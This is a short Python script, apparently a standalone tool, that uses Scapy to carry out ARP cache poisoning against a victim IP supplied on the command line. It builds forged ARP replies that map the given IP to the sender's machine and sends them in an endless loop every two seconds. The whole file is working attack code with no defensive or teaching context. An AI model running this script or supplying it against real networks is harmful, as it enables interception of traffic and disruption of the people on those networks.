from scapy.all import ARP, send, getmacbyip
import sys
import time

def poison(victim_ip, fake_ip):
    victim_mac = getmacbyip(victim_ip)

    arp_response = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=fake_ip)

    print(f"Poisoning {victim_ip}...")

    try:
        while True:
            send(arp_response, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nStop.")

poison(sys.argv[1], sys.argv[2])